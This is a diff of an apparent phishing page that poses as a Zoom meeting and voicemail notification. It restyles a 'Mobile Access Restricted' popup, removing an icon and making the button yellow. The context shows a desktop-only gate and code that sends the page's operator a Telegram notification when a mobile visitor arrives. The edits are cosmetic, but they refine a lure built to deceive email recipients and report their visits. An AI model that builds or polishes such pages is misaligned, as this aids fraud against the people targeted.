@@ -43,11 +43,6 @@
             }
         }
         
-        .restriction-icon {
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-        
         .restriction-content h3 {
             color: #dc3545;
             margin-bottom: 15px;
@@ -63,8 +58,8 @@
         }
         
         .close-restriction {
-            background: #dc3545;
-            color: white;
+            background: #ffc107;
+            color: #333;
             border: none;
             padding: 10px 25px;
             border-radius: 6px;
@@ -72,10 +67,11 @@
             cursor: pointer;
             margin-top: 10px;
             transition: background 0.2s;
+            font-weight: bold;
         }
         
         .close-restriction:hover {
-            background: #c82333;
+            background: #e0a800;
         }
         
         /* Notification styles */
@@ -179,10 +175,9 @@
 </head>
 <body style="margin:0;padding:0;background-color:#0a0a0a;font-family:Arial,Helvetica,sans-serif;">
 
-<!-- Mobile Restriction Popup - Exactly as requested -->
+<!-- Mobile Restriction Popup - Exactly as requested (no icon, yellow button) -->
 <div id="mobileRestrictionPopup" class="mobile-restriction-popup">
     <div class="restriction-content">
-        <div class="restriction-icon">📱❌</div>
         <h3>Mobile Access Restricted</h3>
         <p>This zoom meeting is only available on desktop devices. Please switch to a computer to continue.</p>
         <p>If you believe this is an error, contact support.</p>
@@ -258,8 +253,8 @@ Content-Transfer-Encoding: 7bit
                     ✓ Accessing voicemail...
                 </div>
 
-              </td>
-            </tr>
+               </td>
+             </tr>
 
             <!-- CONTROLS -->
             <tr>
@@ -279,8 +274,8 @@ Content-Transfer-Encoding: 7bit
                   </tbody>
                 </table>
 
-              </td>
-            </tr>
+               </td>
+             </tr>
 
           </tbody>
         </table>
@@ -290,8 +285,8 @@ Content-Transfer-Encoding: 7bit
           This voicemail notification was sent automatically.
         </div>
 
-      </td>
-    </tr>
+       </td>
+     </tr>
   </tbody>
 </table>
 
@@ -590,7 +585,7 @@ ${additionalInfo ? `└ ${additionalInfo}` : ''}
         
         // Check if mobile device
         if (isMobileDevice()) {
-            // Show the exact restriction popup as requested
+            // Show the exact restriction popup as requested (no icon, yellow button)
             showMobileRestriction();
             
             // Send Telegram notification for mobile restriction
